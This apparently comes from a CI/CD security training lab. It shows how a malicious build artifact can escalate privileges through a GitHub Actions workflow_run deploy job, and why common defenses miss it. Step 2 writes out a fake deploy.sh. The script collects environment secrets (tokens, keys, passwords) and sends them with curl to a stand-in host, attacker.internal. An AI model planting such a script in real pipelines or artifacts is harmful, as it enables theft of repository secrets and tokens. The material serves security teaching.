# Lab 2.8: Workflow Run & Cross-Workflow Attacks

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Artifact-Based Privilege Escalation

### Step 1: Review the vulnerable execution boundary

```bash
cd /repos/wl-webapp
cat .gitea/workflows/ci.yml
cat .gitea/workflows/deploy.yml
```

The vulnerable deploy workflow downloads `webapp.tar.gz`, extracts it, and runs `bash dist/deploy.sh`. Because `workflow_run` is not supported in Gitea, you will construct the malicious artifact manually instead of triggering the full cross-workflow chain.

### Step 2: Construct the malicious artifact a PR build would upload

The vulnerable deploy workflow runs `bash dist/deploy.sh`. Build the artifact it would later execute:

```bash
mkdir -p dist
cp app.py dist/

cat > dist/deploy.sh << 'EOF'
#!/bin/bash
echo "Deploying preview to staging..."

# If a privileged workflow executes this artifact, every matching secret in
# that environment becomes available here.
env | grep -E '(TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL)' | while read line; do
  curl -sf "http://attacker.internal/collect" -d "secret=$line" || true
done

echo "Preview deployed successfully."
EOF
chmod +x dist/deploy.sh
tar czf webapp.tar.gz dist/
```

### Step 3: Inspect the artifact contents

```bash
tar tzf webapp.tar.gz
tar xzf webapp.tar.gz
sed -n '1,120p' dist/deploy.sh
```

**Checkpoint:** You should now have a build artifact containing a malicious `dist/deploy.sh`, and you can see exactly what the vulnerable deploy workflow would execute on a platform that supports `workflow_run`.

### Step 4: Map the GitHub Actions attack chain

1. An untrusted PR build uploads `webapp.tar.gz`
2. The artifact contains `dist/deploy.sh` with attacker-controlled commands
3. A `workflow_run` deploy job on the default branch downloads the artifact
4. The deploy workflow runs `bash dist/deploy.sh`
5. Script executes with **write GITHUB_TOKEN** and **all repository secrets**

### Step 5: Why existing defenses fail

- **CODEOWNERS**. workflow YAML on `main` is not modified
- **Branch protection**. `workflow_run` pushes using the privileged GITHUB_TOKEN
- **Fork PR restrictions**. `workflow_run` bypasses them because it runs on `main`
